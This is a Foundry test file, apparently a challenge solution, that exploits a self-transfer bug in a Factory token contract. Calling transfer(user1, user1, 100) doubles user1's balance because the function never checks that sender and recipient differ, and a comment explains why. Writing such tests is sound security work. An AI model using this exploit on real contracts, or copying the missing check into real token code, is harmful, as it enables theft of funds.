// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/Factory.sol";

contract FactoryTest is
    Test,
    Factory
{    
    Factory _factory;
    address user1 = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    address user2 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
    function setUp() public {
        vm.prank(owner);
        _factory = new Factory();

        vm.deal (user1 , 100);
        vm.deal (user2 , 100);

        vm.prank(user1);
        _factory.supply(user1, 100);
        vm.prank(user2);
        _factory.supply(user2, 100);
    }


    function testFactory() public {
        vm.prank(user1);
        
        //solution
        _factory.transfer(user1, user1, 100);

        /**
        vulnerability is in transfer() function
        When we use this function with the same address then
        
        uint256 frombalance = _balances[_from]; //100
        uint256 tobalance = _balances[_to]; //100

        
        _balances[_from] = frombalance - _amount;
        _balances[user1] = 100 - 100 => 0

        _balances[_to] = tobalance + _amount;
        _balances[user1] = 100 + 100 => 200
        
        missing validation if _from != _to
        */

        uint256 newbalance = _factory.checkbalance(user1);
        assertEq(newbalance, 200);
  
    }
}